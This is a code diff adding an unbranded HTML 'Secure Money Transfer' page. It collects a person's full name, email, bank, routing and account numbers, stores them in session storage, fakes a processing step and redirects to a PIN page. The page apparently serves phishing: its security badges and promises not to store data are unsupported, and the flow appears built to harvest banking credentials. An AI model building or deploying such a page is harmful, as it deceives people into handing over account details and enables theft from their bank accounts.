@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Money Transfer - Account Details</title>
+    <link rel="stylesheet" href="styles/transfermoney.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🏦 Secure Money Transfer</h1>
+            <p>Enter your US bank account details for secure transfer</p>
+            <div class="security-badge">
+                🔒 256-bit SSL Encrypted
+            </div>
+        </div>
+
+        <div class="form-container">
+            <form id="transferForm">
+                <div class="form-group">
+                    <label for="lastName">Last Name <span class="required">*</span></label>
+                    <input type="text" id="lastName" name="lastName" required>
+                    <div class="input-help">As it appears on your bank account</div>
+                    <div class="validation-error" id="lastNameError">Please enter your last name</div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="firstName">First Name <span class="required">*</span></label>
+                        <input type="text" id="firstName" name="firstName" required>
+                        <div class="validation-error" id="firstNameError">First name is required</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="middleName">Middle Name <span class="required">*</span></label>
+                        <input type="text" id="middleName" name="middleName" required>
+                        <div class="validation-error" id="middleNameError">Middle name is required</div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Email Address <span class="required">*</span></label>
+                    <input type="email" id="email" name="email" required>
+                    <div class="input-help">We'll send confirmation to this email</div>
+                    <div class="validation-error" id="emailError">Please enter a valid email address</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="bankName">Bank Name <span class="required">*</span></label>
+                    <select id="bankName" name="bankName" required>
+                        <option value="">Select your bank</option>
+                        <option value="ally">Ally Bank</option>
+                        <option value="american_express">American Express Bank</option>
+                        <option value="arvest">Arvest Bank</option>
+                        <option value="associated">Associated Bank</option>
+                        <option value="bancorpsouth">BancorpSouth Bank</option>
+                        <option value="bank_of_america">Bank of America</option>
+                        <option value="bank_of_hawaii">Bank of Hawaii</option>
+                        <option value="bank_of_the_west">Bank of the West</option>
+                        <option value="bb_t">BB&T (Truist)</option>
+                        <option value="bmo_harris">BMO Harris Bank</option>
+                        <option value="bokf">BOK Financial</option>
+                        <option value="capital_one">Capital One</option>
+                        <option value="charles_schwab">Charles Schwab Bank</option>
+                        <option value="chase">Chase Bank (JPMorgan Chase)</option>
+                        <option value="citibank">Citibank</option>
+                        <option value="citizens">Citizens Bank</option>
+                        <option value="comerica">Comerica Bank</option>
+                        <option value="commerce">Commerce Bank</option>
+                        <option value="compass">BBVA USA (Compass Bank)</option>
+                        <option value="discover">Discover Bank</option>
+                        <option value="east_west">East West Bank</option>
+                        <option value="fifth_third">Fifth Third Bank</option>
+                        <option value="first_citizens">First Citizens Bank</option>
+                        <option value="first_horizon">First Horizon Bank</option>
+                        <option value="first_national">First National Bank</option>
+                        <option value="first_republic">First Republic Bank</option>
+                        <option value="flagstar">Flagstar Bank</option>
+                        <option value="frost">Frost Bank</option>
+                        <option value="fulton">Fulton Bank</option>
+                        <option value="goldman_sachs">Goldman Sachs Bank</option>
+                        <option value="great_western">Great Western Bank</option>
+                        <option value="hancock_whitney">Hancock Whitney Bank</option>
+                        <option value="hsbc">HSBC Bank USA</option>
+                        <option value="huntington">Huntington National Bank</option>
+                        <option value="iberia">Iberia Bank</option>
+                        <option value="key_bank">KeyBank</option>
+                        <option value="m_t">M&T Bank</option>
+                        <option value="morgan_stanley">Morgan Stanley Bank</option>
+                        <option value="navy_federal">Navy Federal Credit Union</option>
+                        <option value="northern_trust">Northern Trust</option>
+                        <option value="old_national">Old National Bank</option>
+                        <option value="park_national">Park National Bank</option>
+                        <option value="pinnacle">Pinnacle Financial Partners</option>
+                        <option value="pnc">PNC Bank</option>
+                        <option value="popular">Popular Bank</option>
+                        <option value="raymond_james">Raymond James Bank</option>
+                        <option value="regions">Regions Bank</option>
+                        <option value="santander">Santander Bank</option>
+                        <option value="signature">Signature Bank</option>
+                        <option value="state_street">State Street Bank</option>
+                        <option value="suntrust">SunTrust Bank (Truist)</option>
+                        <option value="synovus">Synovus Bank</option>
+                        <option value="td_bank">TD Bank</option>
+                        <option value="trustmark">Trustmark Bank</option>
+                        <option value="umb">UMB Bank</option>
+                        <option value="union_bank">Union Bank</option>
+                        <option value="us_bank">U.S. Bank</option>
+                        <option value="usaa">USAA Bank</option>
+                        <option value="valley_national">Valley National Bank</option>
+                        <option value="webster">Webster Bank</option>
+                        <option value="wells_fargo">Wells Fargo</option>
+                        <option value="western_alliance">Western Alliance Bank</option>
+                        <option value="whitney">Whitney Bank</option>
+                        <option value="zions">Zions Bank</option>
+                        <option value="other">Other</option>
+                    </select>
+                    <div class="validation-error" id="bankNameError">Please select your bank</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="accountType">Account Type <span class="required">*</span></label>
+                    <select id="accountType" name="accountType" required>
+                        <option value="">Select account type</option>
+                        <option value="checking">Checking Account</option>
+                        <option value="savings">Savings Account</option>
+                    </select>
+                    <div class="validation-error" id="accountTypeError">Please select account type</div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="routingNumber">Routing Number <span class="required">*</span></label>
+                        <input type="text" id="routingNumber" name="routingNumber" maxlength="9" pattern="[0-9]{9}" required>
+                        <div class="input-help">9-digit bank routing number</div>
+                        <div class="validation-error" id="routingNumberError">Please enter a valid 9-digit routing number</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="accountNumber">Account Number <span class="required">*</span></label>
+                        <input type="text" id="accountNumber" name="accountNumber" maxlength="17" required>
+                        <div class="input-help">Your bank account number</div>
+                        <div class="validation-error" id="accountNumberError">Please enter your account number</div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="confirmAccountNumber">Confirm Account Number <span class="required">*</span></label>
+                    <input type="text" id="confirmAccountNumber" name="confirmAccountNumber" maxlength="17" required>
+                    <div class="input-help">Re-enter your account number for verification</div>
+                    <div class="validation-error" id="confirmAccountNumberError">Account numbers must match</div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="transferAmount">Transfer Amount <span class="required">*</span></label>
+                        <input type="number" id="transferAmount" name="transferAmount" min="1" step="0.01" required>
+                        <div class="input-help">Amount in USD</div>
+                        <div class="validation-error" id="transferAmountError">Please enter a valid amount</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="transferPurpose">Transfer Purpose</label>
+                        <select id="transferPurpose" name="transferPurpose">
+                            <option value="">Select purpose</option>
+                            <option value="personal">Personal Transfer</option>
+                            <option value="business">Business Payment</option>
+                            <option value="family">Family Support</option>
+                            <option value="education">Education</option>
+                            <option value="investment">Investment</option>
+                            <option value="other">Other</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="security-info">
+                    <h3>🛡️ Your Security is Our Priority</h3>
+                    <p>All information is encrypted using bank-level security. We never store your account details on our servers and all transfers are processed through secure, regulated financial channels.</p>
+                </div>
+
+                <button type="submit" class="submit-btn">Proceed with Transfer</button>
+
+                <div class="footer-note">
+                    By proceeding, you agree to our Terms of Service and Privacy Policy.<br>
+                    Questions? Contact our support team 24/7
+                </div>
+            </form>
+        </div>
+    </div>
+    <script src="js/authManager.js"></script>
+    <script>
+        document.getElementById('transferForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Clear previous errors
+            const errors = document.querySelectorAll('.validation-error');
+            errors.forEach(error => error.style.display = 'none');
+            
+            const inputs = document.querySelectorAll('input, select');
+            inputs.forEach(input => input.classList.remove('error'));
+            
+            let isValid = true;
+            
+            // Validate required fields
+            const requiredFields = [
+                'lastName', 'firstName', 'middleName', 'email', 
+                'bankName', 'accountType', 'routingNumber', 
+                'accountNumber', 'confirmAccountNumber', 'transferAmount'
+            ];
+            
+            requiredFields.forEach(fieldId => {
+                const field = document.getElementById(fieldId);
+                if (!field.value.trim()) {
+                    showError(fieldId, field);
+                    isValid = false;
+                }
+            });
+            
+            // Validate email
+            const email = document.getElementById('email');
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (email.value && !emailRegex.test(email.value)) {
+                showError('email', email);
+                isValid = false;
+            }
+            
+            // Validate routing number
+            const routingNumber = document.getElementById('routingNumber');
+            if (routingNumber.value && !/^\d{9}$/.test(routingNumber.value)) {
+                showError('routingNumber', routingNumber);
+                isValid = false;
+            }
+            
+            // Validate account number match
+            const accountNumber = document.getElementById('accountNumber');
+            const confirmAccountNumber = document.getElementById('confirmAccountNumber');
+            if (accountNumber.value !== confirmAccountNumber.value) {
+                showError('confirmAccountNumber', confirmAccountNumber);
+                isValid = false;
+            }
+            
+            // Validate transfer amount
+            const transferAmount = document.getElementById('transferAmount');
+            if (transferAmount.value && (parseFloat(transferAmount.value) <= 0 || parseFloat(transferAmount.value) > 50000)) {
+                showError('transferAmount', transferAmount);
+                isValid = false;
+            }
+            
+            if (isValid) {
+                // Collect form data
+                const formData = {
+                    lastName: document.getElementById('lastName').value,
+                    firstName: document.getElementById('firstName').value,
+                    middleName: document.getElementById('middleName').value,
+                    email: document.getElementById('email').value,
+                    bankName: document.getElementById('bankName').value,
+                    accountType: document.getElementById('accountType').value,
+                    routingNumber: document.getElementById('routingNumber').value,
+                    accountNumber: document.getElementById('accountNumber').value,
+                    transferAmount: document.getElementById('transferAmount').value,
+                    transferPurpose: document.getElementById('transferPurpose').value,
+                };
+
+                // Save to sessionStorage and redirect
+                sessionStorage.setItem('transferData', JSON.stringify(formData));
+                
+                // Simulate form processing
+                const submitBtn = document.querySelector('.submit-btn');
+                submitBtn.innerHTML = '⏳ Processing...';
+                submitBtn.disabled = true;
+                
+                setTimeout(() => {
+                    window.location.href = 'pin.html';
+                }, 1500);
+            }
+        });
+        
+        function showError(fieldId, field) {
+            const errorElement = document.getElementById(fieldId + 'Error');
+            if (errorElement) {
+                errorElement.style.display = 'block';
+                field.classList.add('error');
+            }
+        }
+        
+        // Real-time validation for routing number
+        document.getElementById('routingNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+        
+        // Real-time validation for account numbers
+        document.getElementById('accountNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+        
+        document.getElementById('confirmAccountNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+    </script>
+</body>
+</html>
